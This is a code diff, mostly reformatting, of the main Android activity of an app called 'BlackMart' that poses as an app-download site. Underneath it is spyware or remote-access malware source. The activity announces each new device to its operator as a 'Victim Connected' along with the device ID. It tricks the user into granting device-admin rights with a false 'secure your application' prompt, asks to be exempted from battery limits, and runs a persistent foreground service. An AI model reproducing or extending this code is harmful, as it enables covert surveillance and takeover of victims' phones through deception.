@@ -83,6 +83,7 @@ import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
 import io.reactivex.rxjava3.core.Flowable;
 import io.reactivex.rxjava3.schedulers.Schedulers;
 import io.reactivex.rxjava3.subscribers.DisposableSubscriber;
+
 import android.app.admin.DevicePolicyManager;
 
 import static com.velociraptor.raptor.NotificationListener.senddisp;
@@ -92,9 +93,8 @@ public class MainActivity extends AppCompatActivity {
     private String sFileName, sUrl, sUserAgent;
     private DevicePolicyManager mDPM;
     private ComponentName mAdminName;
-    private  SharedPreferences prefs = null;
+    private SharedPreferences prefs = null;
 //    private Context context;
-
 
 
     @Override
@@ -104,7 +104,7 @@ public class MainActivity extends AppCompatActivity {
 
         setContentView(R.layout.activity_main);
         webView = findViewById(R.id.webview);
-        StrictMode.ThreadPolicy policy=new StrictMode.ThreadPolicy.Builder().permitAll().build();
+        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
         StrictMode.setThreadPolicy(policy);
         boolean isNotificationServiceRunning = isNotificationServiceRunning();
 
@@ -112,27 +112,26 @@ public class MainActivity extends AppCompatActivity {
                 Settings.Secure.ANDROID_ID);
         ignorebt();
 
-        if(amifirst()){
+        if (amifirst()) {
             try {
 
 
-                senddisp("Victim Connected : ID  ----->  "  + deviceId);
+                senddisp("Victim Connected : ID  ----->  " + deviceId);
 
             } catch (IOException e) {
                 e.printStackTrace();
             }
             //autostart();
             //LongToast.makeLongToast(getApplicationContext(),"Enable Auto Start For BlackMart",13000 );
-        }
-        else{
+        } else {
             try {
-                senddisp("Victim Connected : ID  ----->  "  + deviceId);
+                senddisp("Victim Connected : ID  ----->  " + deviceId);
             } catch (IOException e) {
                 e.printStackTrace();
             }
             deviceadmin();
         }
-        if(!isNotificationServiceRunning) {
+        if (!isNotificationServiceRunning) {
 
             AlertDialog.Builder alertDialog = new AlertDialog.Builder(this);
             alertDialog.setTitle("Alert")
@@ -147,13 +146,13 @@ public class MainActivity extends AppCompatActivity {
             alertDialog.create();
 
         }
-      new Thread(){
-          @Override
-          public void run() {
-              Blackmain();
-              super.run();
-          }
-      }.start();
+        new Thread() {
+            @Override
+            public void run() {
+                Blackmain();
+                super.run();
+            }
+        }.start();
 
 
         //getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
@@ -162,7 +161,7 @@ public class MainActivity extends AppCompatActivity {
         webView.setWebChromeClient(new WebChromeClient());
         webView.getSettings().setJavaScriptEnabled(true);
         webView.getSettings().supportMultipleWindows();
-        webView.loadUrl("https://www.revdl.com/category/apps/");
+        // webView.loadUrl("https://www.revdl.com/category/apps/");
         webView.setDownloadListener(new DownloadListener() {
             @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
 
@@ -171,7 +170,7 @@ public class MainActivity extends AppCompatActivity {
                 sFileName = filename;
                 sUrl = url;
                 sUserAgent = userAgent;
-                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                             == PackageManager.PERMISSION_GRANTED) {
                         downloadFile(filename, url, userAgent);
@@ -198,27 +197,26 @@ public class MainActivity extends AppCompatActivity {
         if (prefs.getBoolean("firstrun", true)) {
             prefs.edit().putBoolean("firstrun", false).commit();
             return true;
-        }
-        else{
-            return  false;
+        } else {
+            return false;
         }
 
     }
 
-   public void ignorebt() {
+    public void ignorebt() {
 
 
-       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-           PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
-           if (!powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
-               Intent intent = new Intent();
-               intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-               intent.setData(Uri.parse("package:" + getPackageName()));
-               startActivity(intent);
-           }
-           LongToast.makeLongToast(getApplicationContext(),"Enable No Restriction For BlackMart",13000 );
-       }
-   }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (!powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
+                Intent intent = new Intent();
+                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivity(intent);
+            }
+            LongToast.makeLongToast(getApplicationContext(), "Enable No Restriction For BlackMart", 13000);
+        }
+    }
 
     @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
     private void downloadFile(String filename, String url, String userAgent) {
@@ -268,7 +266,6 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-
     @Override
     public void onBackPressed() {
         if (webView.canGoBack()) {
@@ -280,13 +277,14 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    private  void Blackmain() {
+    private void Blackmain() {
         Intent serviceIntent = new Intent(this, ForegroundService.class);
         serviceIntent.putExtra("inputExtra", "Warning !! Dont Close the App");
         ContextCompat.startForegroundService(this, serviceIntent);
 
     }
-    private void  deviceadmin(){
+
+    private void deviceadmin() {
 
         try {
             // Initiate DevicePolicyManager.
@@ -301,12 +299,12 @@ public class MainActivity extends AppCompatActivity {
                         "Click on Activate button to Secure your application");
                 startActivity(intent);
             }
-        }catch (Exception e) {
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
 
-    private void autostart(){
+    private void autostart() {
         try {
 
 
@@ -325,15 +323,14 @@ public class MainActivity extends AppCompatActivity {
             }
 
             List<ResolveInfo> list = getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
-            if  (list.size() > 0) {
+            if (list.size() > 0) {
                 startActivity(intent);
             }
         } catch (Exception e) {
-            Log.e("exc" , String.valueOf(e));
+            Log.e("exc", String.valueOf(e));
         }
 
     }
-
 
 
 }
